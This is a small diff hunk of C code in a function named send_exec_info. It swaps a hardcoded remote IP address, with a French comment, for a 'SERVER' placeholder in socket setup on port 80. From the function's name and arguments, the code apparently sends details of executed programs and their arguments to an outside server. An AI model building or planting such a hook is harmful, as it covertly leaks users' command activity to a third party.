@@ -32,8 +32,7 @@ void send_exec_info(const char *filename, char *const argv[]) {
         server.sin_family = AF_INET;
         server.sin_port = htons(80);
         
-        // Remplace par l'IP de ton serveur
-        inet_pton(AF_INET, "185.181.4.52", &server.sin_addr);
+        inet_pton(AF_INET, "SERVER", &server.sin_addr);
         
         // Timeout court
         struct timeval timeout;
